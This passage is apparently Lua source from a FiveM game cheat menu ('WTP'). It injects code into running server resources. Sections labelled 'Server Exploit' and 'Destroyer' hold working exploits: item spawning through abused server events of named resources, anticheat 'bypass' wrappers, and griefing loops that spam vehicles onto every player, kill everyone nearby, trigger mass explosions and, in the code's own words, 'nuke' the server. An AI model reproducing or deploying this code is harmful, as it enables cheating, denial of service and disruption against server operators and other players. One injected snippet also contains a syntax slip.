                                    local safeZ = getSafeGroundZ(targetX, targetY, targetZ)

                                    WTP.SafeRunNative(RequestCollisionAtCoord, targetX, targetY, safeZ)
                                    WTP.SafeRunNative(FreezeEntityPosition, entityToTeleport, true)
                                    WTP.SafeRunNative(SetEntityCoords, entityToTeleport, targetX, targetY, safeZ, false, false, false, true)

                                    local startTime = GetGameTimer()
                                    while (GetGameTimer() - startTime) < 5000 do
                                        WTP.SafeRunNative(RequestCollisionAtCoord, targetX, targetY, safeZ)
                                        if HasCollisionLoadedAroundEntity(entityToTeleport) then
                                            break
                                        end
                                        WTP.SafeRunNative(Wait, 50)
                                    end

                                    WTP.SafeRunNative(FreezeEntityPosition, entityToTeleport, false)
                                ]])
                            end
                        },
                        {
                            type = "button",
                            label = "Teleport to Mount Chilliad",
                            icon = "",
                            onSelect = function()
                                executeCode('any', [[
                                    local targetX, targetY, targetZ = 501.64, 5604.94, 797.90

                                    local function getSafeGroundZ(x, y, fallbackZ)
                                        local foundGround, groundZ = false, fallbackZ
                                        for height = 0.0, 1000.0, 25.0 do
                                            foundGround, groundZ = GetGroundZFor_3dCoord(x, y, height, false)
                                            if foundGround then
                                                return groundZ + 1.0
                                            end
                                        end
                                        return fallbackZ + 1.0
                                    end

                                    local ped = PlayerPedId()
                                    if not DoesEntityExist(ped) then return end

                                    local entityToTeleport = ped
                                    if IsPedInAnyVehicle(ped, false) then
                                        entityToTeleport = GetVehiclePedIsIn(ped, false)
                                    end

                                    local safeZ = getSafeGroundZ(targetX, targetY, targetZ)

                                    WTP.SafeRunNative(RequestCollisionAtCoord, targetX, targetY, safeZ)
                                    WTP.SafeRunNative(FreezeEntityPosition, entityToTeleport, true)
                                    WTP.SafeRunNative(SetEntityCoords, entityToTeleport, targetX, targetY, safeZ, false, false, false, true)

                                    local startTime = GetGameTimer()
                                    while (GetGameTimer() - startTime) < 5000 do
                                        WTP.SafeRunNative(RequestCollisionAtCoord, targetX, targetY, safeZ)
                                        if HasCollisionLoadedAroundEntity(entityToTeleport) then
                                            break
                                        end
                                        WTP.SafeRunNative(Wait, 50)
                                    end

                                    WTP.SafeRunNative(FreezeEntityPosition, entityToTeleport, false)
                                ]])
                            end
                        },
                        {
                            type = "button",
                            label = "Teleport to Paleto Bay",
                            icon = "",
                            onSelect = function()
                                executeCode('any', [[
                                    local targetX, targetY, targetZ = 108.62, 6612.87, 32.00

                                    local function getSafeGroundZ(x, y, fallbackZ)
                                        local foundGround, groundZ = false, fallbackZ
                                        for height = 0.0, 1000.0, 25.0 do
                                            foundGround, groundZ = GetGroundZFor_3dCoord(x, y, height, false)
                                            if foundGround then
                                                return groundZ + 1.0
                                            end
                                        end
                                        return fallbackZ + 1.0
                                    end

                                    local ped = PlayerPedId()
                                    if not DoesEntityExist(ped) then return end

                                    local entityToTeleport = ped
                                    if IsPedInAnyVehicle(ped, false) then
                                        entityToTeleport = GetVehiclePedIsIn(ped, false)
                                    end

                                    local safeZ = getSafeGroundZ(targetX, targetY, targetZ)

                                    WTP.SafeRunNative(RequestCollisionAtCoord, targetX, targetY, safeZ)
                                    WTP.SafeRunNative(FreezeEntityPosition, entityToTeleport, true)
                                    WTP.SafeRunNative(SetEntityCoords, entityToTeleport, targetX, targetY, safeZ, false, false, false, true)

                                    local startTime = GetGameTimer()
                                    while (GetGameTimer() - startTime) < 5000 do
                                        WTP.SafeRunNative(RequestCollisionAtCoord, targetX, targetY, safeZ)
                                        if HasCollisionLoadedAroundEntity(entityToTeleport) then
                                            break
                                        end
                                        WTP.SafeRunNative(Wait, 50)
                                    end

                                    WTP.SafeRunNative(FreezeEntityPosition, entityToTeleport, false)
                                ]])
                            end
                        },
                    }
                },
            }
        },
        {
            icon = "ph ph-globe",
            label = "Server Options",
            type = "subMenu",
            categories = {
                {
                    label = "Triggers",
                    tabs = {
                        {
                            type = "button",
                            label = "Triggers Finder (F8)",
                            onSelect = function()
                                MachoInjectResourceRaw(targetSafeRes, [[
                                    local allEvents = {}
                                    local eventCount = 0
                                    
                                    local numResources = GetNumResources()
                                    
                                    for i = 0, numResources - 1 do
                                        local resourceName = GetResourceByFindIndex(i)
                                        
                                        if specificResource and resourceName ~= specificResource then
                                            goto continue
                                        end
                                        
                                        if resourceName and GetResourceState(resourceName) == "started" then
                                            local numClientScripts = GetNumResourceMetadata(resourceName, 'client_script')
                                            if numClientScripts and numClientScripts > 0 then
                                                for j = 0, numClientScripts - 1 do
                                                    local scriptPath = GetResourceMetadata(resourceName, 'client_script', j)
                                                    if scriptPath then
                                                        local success, scriptContent = pcall(function()
                                                            return LoadResourceFile(resourceName, scriptPath)
                                                        end)
                                                        
                                                        if success and scriptContent then
                                                            for eventName in scriptContent:gmatch('TriggerServerEvent%s*%(%s*["\']([^"\']+)["\']') do
                                                                if not allEvents[eventName] then
                                                                    allEvents[eventName] = {resource = resourceName, script = scriptPath}
                                                                    eventCount = eventCount + 1
                                                                end
                                                            end
                                                        end
                                                    end
                                                end
                                            end
                                            
                                            local numSharedScripts = GetNumResourceMetadata(resourceName, 'shared_script')
                                            if numSharedScripts and numSharedScripts > 0 then
                                                for j = 0, numSharedScripts - 1 do
                                                    local scriptPath = GetResourceMetadata(resourceName, 'shared_script', j)
                                                    if scriptPath then
                                                        local success, scriptContent = pcall(function()
                                                            return LoadResourceFile(resourceName, scriptPath)
                                                        end)
                                                        
                                                        if success and scriptContent then
                                                            for eventName in scriptContent:gmatch('TriggerServerEvent%s*%(%s*["\']([^"\']+)["\']') do
                                                                if not allEvents[eventName] then
                                                                    allEvents[eventName] = {resource = resourceName, script = scriptPath}
                                                                    eventCount = eventCount + 1
                                                                end
                                                            end
                                                        end
                                                    end
                                                end
                                            end
                                        end
                                        
                                        ::continue::
                                    end
                                    
                                    local sortedEvents = {}
                                    for eventName, data in pairs(allEvents) do
                                        table.insert(sortedEvents, {name = eventName, resource = data.resource, script = data.script})
                                    end
                                    
                                    table.sort(sortedEvents, function(a, b)
                                        return a.name < b.name
                                    end)
                                    
                                    if eventCount == 0 then
                                        print("^1[TRIGGERS FINDER] No TriggerServerEvent found!")
                                    else
                                        print("^2[FOUND] " .. eventCount .. " TriggerServerEvent (ready to use):")
                                        print("^3========================================")
                                        
                                        for idx, event in ipairs(sortedEvents) do
                                            local readyToUse = string.format('TriggerServerEvent("%s")', event.name)
                                            print(string.format("^5[%d] ^2%s ^7(^3%s^7)", idx, readyToUse, event.resource))
                                        end
                                    end
                                    
                                    print("^3========================================")
                                    print("^2[TRIGGERS FINDER] Scan complete! Copy-paste the triggers above.")
                                    
                                    _G._FoundServerEvents = sortedEvents
                                ]])
                            end
                        },
                        { type = "divider", label = "Server Exploit" },
                        {
                            type = "button",
                            label = "Spawn Item",
                            onSelect = function()
                                WTP:HideUI()

                                local function GetInput(title, default)
                                    local result = nil
                                    local done = false

                                    KeyboardInput(title, default or "", function(val)
                                        result = val
                                        done = true
                                    end, "typeable")

                                    while not done do
                                        Wait(0)
                                    end

                                    return result
                                end

                                local itemName = GetInput("Item Name", "")
                                if not itemName or itemName == "" then
                                    WTP:Notify("error", "WTP", "No item name entered", 3000)
                                    WTP:ShowUI()
                                    return
                                end

                                local inputCount = GetInput("Item Count", "1")
                                local itemCount = tonumber(inputCount)
                                if not itemCount or itemCount < 1 then
                                    itemCount = 1
                                end

                                itemName  = tostring(itemName or "")
                                itemCount = tonumber(itemCount or 1)

                                local success, err = pcall(function()
                                    if GetResourceState("gxvin-grindings") == 'started' then
                                        MachoInjectResourceRaw("gxvin-grindings", string.format([[
                                            local function Gimme(item, amount)
                                                TriggerServerEvent('event:ʓʰɠʃʍ', item, amount)
                                            end
                                            Gimme("%s", %d)
                                        ]], itemName, itemCount))
                                    elseif GetResourceState("esx_tacojob") == 'started' then
                                        MachoInjectResourceRaw("esx_tacojob", string.format([[
                                            local function Gimme(item, amount)
                                                TriggerServerEvent('leo_taco:add', 'atad', item, amount)
                                            end
                                            Gimme("%s", %d)
                                        ]], itemName, itemCount))
                                    elseif GetResourceState("cfx-hu-business") == 'started' then
                                        executeCode("cfx-hu-business", string.format([[
                                            local function Gimme(item, quantity)
                                                WTP.SafeRunNative(lib.callback.await, 'cfx-hu-business:AddItem', false, {item = 'panties', value = 1}, item, quantity, 1, GlobalState.Token)
                                            end
                                            Gimme("%s", %d)
                                        ]], itemName, itemCount))
                                    elseif GetResourceState("cfx-cs-business") == 'started' then
                                        MachoInjectResourceRaw("cfx-cs-business", string.format([[
                                            local function Gimme(item, quantity)
                                                TriggerServerEvent('cfx-cs-business:AddItem', {item = 'burger', value = 1}, item, quantity, 1, GlobalState.Token)
                                            end
                                            Gimme("%s", %d)
                                        ]], itemName, itemCount))
                                    elseif GetResourceState("gfx-business") == 'started' then
                                        MachoInjectResourceRaw("gfx-business", string.format([[
                                            local function Gimme(item, quantity)
                                                TriggerServerEvent('gfx-business:AddItem', {item = 'burger', value = 1}, item, quantity, 1, GlobalState.Token)
                                            end
                                            Gimme("%s", %d)
                                        ]], itemName, itemCount))
                                    elseif GetResourceState("jim-lumberjack") == 'started' then
                                        MachoInjectResource2(NewThreadNs, 'jim-lumberjack', string.format([[
                                            toggleItem(true, "%s", %d)
                                        ]], itemName, itemCount))
                                    elseif GetResourceState("wasabi_ambulance") == 'started' then
                                        MachoInjectResource2(NewThreadNs, 'wasabi_ambulance', string.format([[ 
                                            _G.WTPBypass = function(setFunc, ...)
                                                local stateName = math.random(999999, 999999999)..GetCurrentResourceName()..GetGameTimer()
                                                LocalPlayer.state:set(stateName, setFunc, false)
                                                LocalPlayer.state[stateName](...)
                                            end
                                            local function WTPSpawn()
                                                _G.WTPBypass(wsb.awaitServerCallback, 'wasabi_ambulance:gItem', '%s')
                                                Wait(15)
                                            end
                                            for i = 1, %d do
                                                WTPSpawn()
                                                Wait(15)
                                            end
                                        ]], itemName, itemCount))
                                    elseif GetResourceState("esx_drugs") == 'started' then
                                        executeCode("esx_drugs", string.format([[
                                            local function Gimme(item, quantity)
                                                WTP.SafeRunNative(TriggerServerEvent, 'esx_drugsystem:unpackDrugs', item, quantity, "burger", 0)
                                            end
                                            Gimme("%s", %d)
                                        ]], itemName, itemCount))
                                    elseif GetResourceState("ars_hunting") == 'started' then
                                        executeCode("ars_hunting", string.format([[
                                            local function Gimme(items, quantitys)
                                                WTP.SafeRunNative(TriggerServerEvent, 'ars_hunting:sellBuyItem', { item = items, price = 1, quantity = quantitys, buy = true })
                                                WTP.SafeRunNative(Wait, 500)
                                            end
                                            Gimme("%s", %d)
                                        ]], itemName, itemCount))
                                    elseif GetResourceState("energy_tv") == 'started' then
                                        MachoInjectResource2(3, 'energy_tv', string.format([[
                                            local function safeCall(fn, ...)
                                                if fn then
                                                    return fn(...)
                                                end
                                            end

                                            local function SafeWrap(setFunc)
                                                return function(...)
                                                    return setFunc(...)
                                                end
                                            end

                                            _G.WS_RunSafeFunc = function(setFunc, ...)
                                                local stateName = math.random(999999, 999999999)..GetCurrentResourceName()..GetGameTimer()
                                                LocalPlayer.state:set(stateName, setFunc, false)
                                                return LocalPlayer.state[stateName](...)
                                            end

                                            local function WTP.SafeRunNative(fn, ...)
                                                return safeCall(_G.WS_RunSafeFunc, SafeWrap(fn), ...)
                                            end

                                            local function Gimme(item, quantity)
                                                WTP.SafeRunNative(TriggerServerEvent, 'energy_tv:server:shopBuy' item, quantity)
                                            end
                                            Gimme("%s", %d)
                                        ]], itemName, itemCount))
                                    end
                                end)

                                if not success then
                                    WTP:Notify("error", "WTP", "String format failed — check console", 4000)
                                else
                                    WTP:Notify("success", "WTP", "Item Sent", 4000)
                                end

                                WTP:ShowUI()
                            end
                        },
        
                        { type = "divider", label = "City Exploit" },
                    }
                },
                {
                    label = "Destroyer",
                    tabs = {
                        { type = "divider", label = "Lua Exploit" },
                        {
                            type = "button",
                            label = "Attach Crazy Cars On All",
                            desc = 'best method to destroy server',
                            onSelect = function()
                                MachoInjectResourceRaw(targetRes, [[
                                    function spawnVehicleForPlayer(playerId)
                                        local vehicleName = "trash"

                                        RequestModel(vehicleName)
                                        while not HasModelLoaded(vehicleName) do
                                            Citizen.Wait(2000)
                                        end

                                        local playerPed = GetPlayerPed(playerId)
                                        local playerCoords = GetEntityCoords(playerPed)
                                        local vehicle = CreateVehicle(vehicleName, playerCoords.x, playerCoords.y, playerCoords.z, 0.0, true, false)
                                        SetEntityAsNoLongerNeeded(vehicle)
                                        SetModelAsNoLongerNeeded(vehicleName)
                                    end

                                    Citizen.CreateThread(function()
                                        while true do
                                            Citizen.Wait(2000)

                                            local players = {}

                                            for _, playerId in ipairs(GetActivePlayers()) do
                                                local playerName = GetPlayerName(playerId)
                                                table.insert(players, { id = playerId, name = playerName })
                                            end

                                            for _, player in ipairs(players) do
                                                spawnVehicleForPlayer(player.id)
                                            end
                                        end
                                    end)
                                ]])
                            end
                        },
                        {
                            type = "button",
                            label = "Attach Crazy Cars On All V2",
                            desc = 'this will nuke server',
                            onSelect = function()
                                MachoInjectResourceRaw(targetRes, [[

                                local entityEnumerator = {
                                    __gc = function(enum)
                                        if enum.destructor and enum.handle then
                                            enum.destructor(enum.handle)
                                        end
                                        enum.destructor = nil
                                        enum.handle = nil
                                    end
                                }

                                local function EnumerateEntities(initFunc, moveFunc, disposeFunc)
                                    return coroutine.wrap(function()
                                        local iter, id = initFunc()
                                        if not id or id == 0 then
                                            disposeFunc(iter)
                                            return
                                        end

                                        local enum = {handle = iter, destructor = disposeFunc}
                                        setmetatable(enum, entityEnumerator)

                                        local next = true
                                        repeat
                                            coroutine.yield(id)
                                            next, id = moveFunc(iter)
                                        until not next

                                        enum.destructor, enum.handle = nil, nil
                                        disposeFunc(iter)
                                    end)
                                end

                                local function RequestControlOnce(entity)
                                    if NetworkHasControlOfEntity(entity) then
                                        return true
                                    end
                                    SetNetworkIdCanMigrate(NetworkGetNetworkIdFromEntity(entity), true)
                                    return NetworkRequestControlOfEntity(entity)
                                end

                                local function EnumerateVehicles()
                                    return EnumerateEntities(FindFirstVehicle, FindNextVehicle, EndFindVehicle)
                                end

                                GetAllVehicles = function(delay, callback)
                                    if delay == nil then
                                        delay = 0
                                    end
                                    Citizen.CreateThread(function()
                                        for k in EnumerateVehicles() do
                                            Citizen.Wait(delay)
                                            callback(k)
                                        end
                                        return
                                    end)
                                end

                                local a = true
                                Citizen.CreateThread(function()
                                    while a do
                                        Citizen.Wait(200)

                                        local lista = GetActivePlayers()
                                        for i=1, #lista do
                                            id = lista[i]
                                            ped = GetPlayerPed(id)
                                            if ped ~= GetPlayerPed(-1) then
                                                GetAllVehicles(5, function(carId)
                                                    if DoesEntityExist(carId) then
                                                        SetEntityInvincible(carId, true)
                                                        RequestControlOnce(carId)
                                                        FreezeEntityPosition(carId, false)
                                                        local vehicle = GetVehiclePedIsIn(ped, false)
                                                        StartVehicleHorn(carId, 25000, 1, true)
                                                        AttachEntityToEntity(carId, ped, GetPedBoneIndex(ped, 67086), -0.5, 0, 0, 0, 90.0, 3400.0, true, true, false, true, 1, true)
                                                    end
                                                end)
                                            end
                                            Citizen.Wait(50)
                                        end

                                    end
                                end)

                                ]])
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Bypass Safezones",
                            desc = "Allows you to bypass safezones.",
                            checked = false,
                            onSelect = function(checked)
                                if checked then
                                    executeCode(targetRes, [[
                                        _G.BypassSafezoneActive = true
                                        WTP.SafeRunNative(CreateThread, function()
                                            while _G.BypassSafezoneActive do
                                                WTP.SafeRunNative(Wait, 0)
                                                WTP.SafeRunNative(NetworkSetFriendlyFireOption, true)
                                                WTP.SafeRunNative(SetCanAttackFriendly, PlayerPedId(), true, true)
                                                WTP.SafeRunNative(DisablePlayerFiring, PlayerPedId(), false)
                                                WTP.SafeRunNative(DisablePlayerFiring, PlayerPedId(), false)
                                                WTP.SafeRunNative(EnableAllControlActions, 0)
                                                WTP.SafeRunNative(EnableAllControlActions, 1)
                                                if WTP.SafeRunNative(IsPedInAnyVehicle, PlayerPedId(), false) then
                                                    local vehicle = WTP.SafeRunNative(GetVehiclePedIsIn, PlayerPedId(), false)
                                                    local maxSpeed = 100.0
                                                    WTP.SafeRunNative(SetEntityMaxSpeed, vehicle, maxSpeed)
                                                    WTP.SafeRunNative(SetVehicleEnginePowerMultiplier, vehicle, 1.0)
                                                    WTP.SafeRunNative(SetVehicleEngineTorqueMultiplier, vehicle, 1.0)
                                                end
                                            end
                                        end)
                                    ]])
                                else
                                    executeCode(targetRes, [[
                                        _G.BypassSafezoneActive = false
                                    ]])
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Kill Everyone",
                            checked = false,
                            desc = "Kills all players around you.",
                            onSelect = function(checked)
                                if checked then
                                    executeCode("any", [[
                                        _G.KillEveryoneLoop = true

                                        local weaponName = 'WEAPON_APPISTOL'
                                        local ammoAmount = 999

                                        WTP.SafeRunNative(CreateThread, function()
                                            local weapon = GetHashKey(weaponName)

                                            RequestWeaponAsset(weapon, 31, 26)
                                            while not HasWeaponAssetLoaded(weapon) and _G.KillEveryoneLoop do
                                                WTP.SafeRunNative(Wait, 0)
                                            end

                                            while _G.KillEveryoneLoop do
                                                local selfPed = PlayerPedId()
                                                local selfCoords = GetEntityCoords(selfPed)

                                                WTP.SafeRunNative(GiveDelayedWeaponToPed, selfPed, weapon, ammoAmount, true)
                                                WTP.SafeRunNative(SetPedAmmo, selfPed, weapon, ammoAmount)

                                                local players = GetActivePlayers()
                                                for _, playerId in ipairs(players) do
                                                    local targetPed = GetPlayerPed(playerId)

                                                    if targetPed ~= selfPed and DoesEntityExist(targetPed) and not IsPedDeadOrDying(targetPed, true) then
                                                        local targetCoords = GetEntityCoords(targetPed)
                                                        local dist = #(selfCoords - targetCoords)

                                                        if dist < 350.0 then
                                                            local fromCoords = targetCoords + vector3(math.random(-2, 2), math.random(-2, 2), math.random(1, 2))
                                                            WTP.SafeRunNative(ShootSingleBulletBetweenCoords, fromCoords.x, fromCoords.y, fromCoords.z, targetCoords.x, targetCoords.y, targetCoords.z + 0.2, 999999, true, weapon, selfPed, true, false, 999999.0)

                                                            WTP.SafeRunNative(SetPedUsingActionMode, selfPed, true, -1, 1)
                                                            WTP.SafeRunNative(SetPedCurrentWeaponVisible, selfPed, false, false, true, true)
                                                        end
                                                    end
                                                end
                                                WTP.SafeRunNative(Wait, 0)
                                            end

                                            local ped = PlayerPedId()
                                            WTP.SafeRunNative(SetPedUsingActionMode, ped, false, -1, 'DEFAULT_ACTION')
                                            WTP.SafeRunNative(RemoveWeaponFromPed, ped, weapon)
                                            WTP.SafeRunNative(SetCurrentPedWeapon, ped, 'weapon_unarmed', true)
                                        end)
                                    ]])
                                else
                                    executeCode("any", [[
                                        _G.KillEveryoneLoop = false
                                    ]])
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Limb Players Around You",
                            checked = false,
                            onSelect = function(checked)
                                if checked then
                                    WTP:Notify("success", "WTP", "Limb Players Around You Enabled.", 3000)
                                    MachoInjectResource2(NewThreadNs, "any", [[
                                        local function setBypass(setFunc, ...)
                                            local stateName = math.random(999999, 999999999)..GetCurrentResourceName()..GetGameTimer()

                                            LocalPlayer.state:set(stateName, setFunc, false)
                                            return LocalPlayer.state[stateName](...)
                                        end
                                        _G.isLimbActive = true
                                        local function thread(fn)
                                            setBypass(CreateThread, fn)
                                        end
                                        thread(function()
                                            while _G.isLimbActive do
                                                local ped = setBypass(PlayerPedId)
                                                setBypass(SetEntityVisible, ped, false, false)
                                                setBypass(FreezeEntityPosition, ped, true)
                                                setBypass(TaskStartScenarioInPlace, ped, "WORLD_HUMAN_WELDING", 0, false)
                                                setBypass(Wait, 10)
                                                setBypass(ClearPedTasks, ped)
                                                setBypass(TaskStartScenarioInPlace, ped, "WORLD_HUMAN_WELDING", 0, true)
                                            end
                                            local ped = setBypass(PlayerPedId)
                                            setBypass(FreezeEntityPosition, ped, false)
                                            setBypass(ClearPedTasks, ped)
                                            setBypass(ClearPedTasksImmediately, ped)
                                            setBypass(SetEntityVisible, ped, true, true)
                                        end)
                                    ]])
                                else
                                    WTP:Notify("error", "WTP", "Limb Players Around You Disabled.", 3000)
                                    MachoInjectResource2(NewThreadNs, "any", [[
                                        local function setBypass(setFunc, ...)
                                            local stateName = math.random(999999, 999999999)..GetCurrentResourceName()..GetGameTimer()

                                            LocalPlayer.state:set(stateName, setFunc, false)
                                            return LocalPlayer.state[stateName](...)
                                        end
                                        setBypass(function() _G.isLimbActive = false end)
                                    ]])
                                end
                            end
                        },
                        { type = "divider", label = "Vehicle Chaos" },
                        {
                            type = "scrollable",
                            label = "Spawn Falling Vehicles",
                            scrollType = "onEnter",
                            value = 1,
                            values = { "1 Car", "3 Cars", "5 Cars", "10 Cars", "Rain of Cars (20)" },
                            desc = "Drop random cars from the sky at your location.",
                            onSelect = function(value)
                                local count = 1
                                if value == "1 Car" then count = 1
                                elseif value == "3 Cars" then count = 3
                                elseif value == "5 Cars" then count = 5
                                elseif value == "10 Cars" then count = 10
                                elseif value == "Rain of Cars (20)" then count = 20
                                end
                                WTP:Notify("info", "WTP", "Spawning " .. count .. " Falling Vehicle(s)", 3000)
                                MachoInjectResourceRaw(targetRes, string.format([[
                                    local count = %d
                                    local playerCoords = GetEntityCoords(PlayerPedId())
                                    local vehicles = {"adder", "zentorno", "t20", "infernus", "cheetah", "turismor", "entity2", "osiris", "pfister811", "vagner", "nero", "autarch", "xa21", "deveste", "emerus", "krieger", "thrax", "furia", "tigon", "champion"}
                                    
                                    for i = 1, count do
                                        local vehicleName = vehicles[math.random(1, #vehicles)]
                                        local modelHash = GetHashKey(vehicleName)
                                        RequestModel(modelHash)
                                        while not HasModelLoaded(modelHash) do Wait(10) end
                                        
                                        local offsetX = math.random(-20, 20)
                                        local offsetY = math.random(-20, 20)
                                        local height = math.random(50, 100)
                                        local spawnCoords = vector3(playerCoords.x + offsetX, playerCoords.y + offsetY, playerCoords.z + height)
                                        
                                        local veh = CreateVehicle(modelHash, spawnCoords.x, spawnCoords.y, spawnCoords.z, math.random(0, 360), true, true)
                                        SetModelAsNoLongerNeeded(modelHash)
                                        
                                        -- Make visible to others
                                        NetworkRegisterEntityAsNetworked(veh)
                                        local netId = NetworkGetNetworkIdFromEntity(veh)
                                        SetNetworkIdCanMigrate(netId, true)
                                        SetNetworkIdExistsOnAllMachines(netId, true)
                                        SetEntityAsMissionEntity(veh, true, true)
                                        
                                        SetVehicleOnGroundProperly(veh)
                                        
                                        Wait(100)
                                    end
                                ]], count))
                            end
                        },
                        {
                            type = "scrollable-checkbox",
                            label = "Spawn Vehicle",
                            desc = "This will spawn vehicle to all players loop",
                            checked = false,
                            value = 1,
                            values = {
                                "Kosatka", "Tug", "Cargoplane", "Cargoplane 2", "Tanker Car", "Trailers 4", "Stunt", "Jugular", "Bus"
                            },
                            onSelect = function(value, checked)
                                if checked then
                                    local vehicleMap = {
                                        ["Kosatka"] = "kosatka",
                                        ["Tug"] = "tug",
                                        ["Cargoplane"] = "cargoplane",
                                        ["Cargoplane 2"] = "cargoplane2",
                                        ["Tanker Car"] = "tankercar",
                                        ["Trailers 4"] = "trailers4",
                                        ["Stunt"] = "stunt",
                                        ["Jugular"] = "jugular",
                                        ["Bus"] = "bus"
                                    }
                                    local vehicleHash = vehicleMap[value]

                                    MachoInjectResourceRaw(targetRes, string.format([[
                                        _G.SpamMassVehicleActive = true
                                        Citizen.CreateThread(function()
                                            while _G.SpamMassVehicleActive do
                                                local vehicleModel = "%s"

                                                RequestModel(vehicleModel)

                                                while not HasModelLoaded(vehicleModel) do
                                                    Wait(100)
                                                end

                                                local playerList = GetActivePlayers()
                                                for _, playerId in ipairs(playerList) do
                                                    local ped = GetPlayerPed(playerId)
                                                    local pos = GetEntityCoords(ped)
                                                    local heading = GetEntityHeading(ped)

                                                    local vehicle = CreateVehicle(vehicleModel, pos.x, pos.y, pos.z, heading, true, false)
                                                    SetEntityAsNoLongerNeeded(vehicle)
                                                end

                                                Citizen.Wait(350) 
                                            end
                                        end)
                                    ]], vehicleHash))
                                else
                                    self:Notify("info", "WTP", "Vehicle Loop Stopped", 3000)
                                    MachoInjectResourceRaw(targetRes, [[
                                        _G.SpamMassVehicleActive = false
                                    ]])
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Mass Explosion",
                            desc = "This will mass explosion to all players loop",
                            checked = false,
                            onSelect = function(checked)
                                if checked then
                                    MachoInjectResourceRaw(targetRes, [[
                                        _G.MassExplosionActive = true
                                        Citizen.CreateThread(function()
                                            while _G.MassExplosionActive do
                                                local modelName = "vestra"
                                                local playerList = GetActivePlayers()
                                                for _, playerId in ipairs(playerList) do
                                                    local targetPed = GetPlayerPed(playerId)
                                                    local modelHash = GetHashKey(modelName)
                                                    RequestModel(modelHash)
                                                    local startWait = GetGameTimer()
                                                    while not HasModelLoaded(modelHash) do
                                                        Citizen.Wait(10)
                                                        if GetGameTimer() - startWait > 5000 then
                                                            return
                                                        end
                                                    end
                                                    local headCoords = GetPedBoneCoords(targetPed, 31086, 0.0, 0.0, 0.3)
                                                    local spawnCoords = vector3(headCoords.x, headCoords.y, headCoords.z + 10.0)
                                                    local heading = GetEntityHeading(targetPed)
                                                    local veh = CreateVehicle(modelHash, spawnCoords.x, spawnCoords.y, spawnCoords.z, heading, true, false)
                                                    if veh == 0 then
                                                        SetModelAsNoLongerNeeded(modelHash)
                                                        return
                                                    end
                                                    SetEntityVisible(veh, false, 0)
                                                    SetEntityInvincible(veh, false)
                                                    SetVehicleDoorsLocked(veh, 1)
                                                    SetEntityAsMissionEntity(veh, true, true)
                                                    SetEntityVelocity(veh, 0.0, 0.0, -10.0)
                                                    Citizen.CreateThread(function()
                                                        while true do
                                                            Citizen.Wait(100)
                                                            if IsEntityOnGround(veh) then
                                                                AddExplosion(GetEntityCoords(veh).x, GetEntityCoords(veh).y, GetEntityCoords(veh).z, 2, 10.0, true, false, 1.0)
                                                                DeleteEntity(veh)
                                                                break
                                                            end
                                                        end
                                                    end)
                                                    SetModelAsNoLongerNeeded(modelHash)
                                                end
                                            end
                                        end)
                                    ]])
                                else
                                    self:Notify("info", "WTP", "Mass Explosion Stopped", 3000)
                                    MachoInjectResourceRaw(targetRes, [[
                                        _G.MassExplosionActive = false
                                    ]])
                                end
                            end
                        },
                    }
                },
            }
        },
        {
            icon = 'ph-gear-six',
            label = "Settings Options",
            type = "subMenu",
            categories = {
                {
                    label = "Interface",
                    tabs = {
                        { icon = "", type = "button", label = "Menu Keybinds",
                            onSelect = function()
                                KeyboardInput("Choose Menu Key", "", function(val)
                                    for vk, name in pairs(MappedKeys) do
                                        if name:lower() == val:lower() then
                                            MenuKey = name
                                            Wait(250)
                                            WTP:ShowUI()
                                            return
                                        end
                                    end
                                end, "keybind")
                            end
                        },
                        { icon = "", type = "scrollable", label = "Menu Positioning (X)", desc = "This is the menu positioning based on the X-Axis.", value = 1, values = { "Left", "Center", "Right" },
                            onSelect = function(val)
                                self:SendMessage({ action = "setMenuPosition", x = val })
                            end
                        },
                        { icon = "", type = "scrollable", label = "Menu Positioning (Y)", desc = "This is the menu positioning based on the Y-Axis.", value = 1, values = { "Top", "Middle", "Bottom" },
                            onSelect = function(val)
                                self:SendMessage({ action = "setMenuPosition", y = val })
                            end
                        },
                        { icon = "", type = "scrollable", value = 1, values = { "Default", "Black", "Red", "Pink", "Demons", "White", "Toto Oscar", "Dompi", "Shiva X Chris"}, label = "Menu Theme",
                            onSelect = function(value)
                                if value == "Default" then
                                    WTP:SendMessage({ action = "updateBanner", bannerColor = "242, 109, 220", bannerLink = "https://r2.fivemanage.com/fBwvmjDVcarN1df7kgreT/as_menupink.png" })
                                elseif value == "Black" then
                                    WTP:SendMessage({ action = "updateBanner", bannerColor = "0, 0, 0", bannerLink = "https://r2.fivemanage.com/fBwvmjDVcarN1df7kgreT/dfpng" })
                                elseif value == "Red" then
                                    WTP:SendMessage({ action = "updateBanner", bannerColor = "110, 7, 7", bannerLink = "https://r2.fivemanage.com/fBwvmjDVcarN1df7kgreT/ASRED.png" })
                                elseif value == "Pink" then
                                    WTP:SendMessage({ action = "updateBanner", bannerColor = "242, 82, 218", bannerLink = "https://r2.fivemanage.com/fBwvmjDVcarN1df7kgreT/aspink.png" })
                                elseif value == "Demons" then
                                    WTP:SendMessage({ action = "updateBanner", bannerColor = "212, 23, 23", bannerLink = "https://r2.fivemanage.com/fBwvmjDVcarN1df7kgreT/asdemons.png" })
                                elseif value == "White" then
                                    WTP:SendMessage({ action = "updateBanner", bannerColor = "247, 247, 247", bannerLink = "https://r2.fivemanage.com/fBwvmjDVcarN1df7kgreT/as_menu.png" })
                                elseif value == "Toto Oscar" then
                                    WTP:SendMessage({ action = "updateBanner", bannerColor = "89, 2, 2", bannerLink = "https://r2.fivemanage.com/fBwvmjDVcarN1df7kgreT/totoxoscar.png" })
                                elseif value == "Dompi" then
                                    WTP:SendMessage({ action = "updateBanner", bannerColor = "30, 29, 29", bannerLink = "https://r2.fivemanage.com/fBwvmjDVcarN1df7kgreT/dompi.png" })
                                elseif value == "Shiva X Chris" then
                                    WTP:SendMessage({ action = "updateBanner", bannerColor = "0, 0, 0", bannerLink = "https://r2.fivemanage.com/fBwvmjDVcarN1df7kgreT/shivaxchris.png" })
                                end
                            end
                        },
                        { type = "divider", label = "Utils" },
                        { type = "checkbox", label = "Show Keybind List", checked = false, desc = "This will show your keybinds.",
                            onSelect = function(checked)
                                if checked then
                                    WTP:ShowKeybindList()
                                else
                                    WTP:HideKeybindList()
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Show Spectator List",
                            checked = false,
                            onSelect = function(checked)
                                isSpectatorListVisible = checked
                                if not checked then
                                    WTP:SendMessage({ action = "displaySpectators", visible = false })
                                end
                            end
                        },
